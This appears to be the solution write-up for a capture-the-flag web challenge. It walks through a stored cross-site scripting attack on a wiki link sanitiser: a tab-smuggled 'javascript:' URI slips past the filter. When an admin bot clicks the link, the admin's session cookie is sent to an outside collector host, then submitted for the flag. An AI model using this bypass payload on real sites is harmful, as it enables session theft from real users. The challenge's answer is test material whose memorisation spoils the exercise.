Full chain. Post one wiki page whose link href is a tab-smuggled `javascript:`
URI (the byte between `java` and `script` is a literal TAB, `\t` / 0x09):

```
POST /pages
Content-Type: application/json

{"body":"[click me](java\tscript:void(new Image().src='http://collector:9000/report?c='+encodeURIComponent(document.cookie)))"}
```

The greedy link regex captures the URL up to the last `)`, so the `void(...)` and
`encodeURIComponent(...)` parentheses are preserved. The `javascript:` strip finds
no literal match (the tab is in the way), and there is no `"` to encode, so the
href is emitted verbatim:

```html
<a
  class="wiki-link"
  href="java&#9;script:void(new Image().src='http://collector:9000/report?c='+encodeURIComponent(document.cookie))"
  >click me</a
>
```

Wait ~2s. The admin bot loads `/admin/review`, **clicks** `a.wiki-link`, the
browser normalises the tab away, and `javascript:` runs in the admin's session —
reading `document.cookie` and beaconing it out. Read what the collector captured:

```
GET /oob/received            # item path like /report?c=session%3D<32 hex>
```

That 32-hex value is the admin session. Submit it:

```
POST /solve
Content-Type: application/json

{"c":"<32 hex>"}
```

and you get `FLAG{…}`. (`/solve` accepts the bare 32-hex or a full
`session=<value>` string.) `tests/exploit.py` runs the whole flow and also asserts
`/admin/review` is `403` for you — proving you never load the page you attack; the
admin's click does it for you.
